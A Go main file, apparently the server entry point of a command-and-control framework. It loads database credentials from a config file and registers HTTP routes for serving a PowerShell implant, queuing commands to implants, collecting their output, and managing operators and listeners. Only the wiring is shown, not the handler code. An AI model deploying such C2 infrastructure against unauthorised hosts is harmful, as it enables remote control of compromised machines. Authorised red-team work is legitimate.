package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"sync"

	_ "github.com/go-sql-driver/mysql"
)

var (
	db *sql.DB

	messages []Alerts
	mutex    sync.Mutex
)

func main() {
	go TCPCreate()
	config, err1 := LoadConfiguration("aef-profile.json")
	if err1 != nil {
		fmt.Println(err1)
		return
	}

	user := config[0].Server[0].SQLUser
	pass := config[0].Server[0].SQLPass

	var err error
	db, err = sql.Open("mysql", user+":"+pass+"@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	// Second server config
	serverIP := config[0].Server[1].IP
	serverPort := config[0].Server[1].Port
	var socket = serverIP + ":" + serverPort

	// Mux for server2
	mux := http.NewServeMux()

	// Implant Handling
	mux.HandleFunc("/agents/windows/powershell", powerShellImplant)
	//mux.HandleFunc("/generate/windows/implant", generateImplant)

	// Instructions for Implants handling
	mux.HandleFunc("/getOutput", getOutput)
	mux.HandleFunc("/postCommand", postCommand)

	// Register and Login for Operators
	mux.HandleFunc("/operators/register", registerOperatorHandler)
	mux.HandleFunc("/operators/login", loginOperatorHandler)

	// Get all Clients registered in the database
	mux.HandleFunc("/getClients", getClients)

	// Create unique listeners for multiple implants
	mux.HandleFunc("/generate/listener", createListener)
	mux.HandleFunc("/getListeners", getListeners)
	mux.HandleFunc("/clearListeners", clearListeners)

	// Chat system
	mux.HandleFunc("/messagePost", messagePost)
	mux.HandleFunc("/messageGet", messageGet)

	// Alerts system
	mux.HandleFunc("/getAlerts", messagesHandler)

	fmt.Println("Admin Server: " + socket)
	err = http.ListenAndServe(socket, mux)
	if err != nil {
		log.Fatal("[-X-] ListenAndServe for main Admin socket: ", err)
	}
}
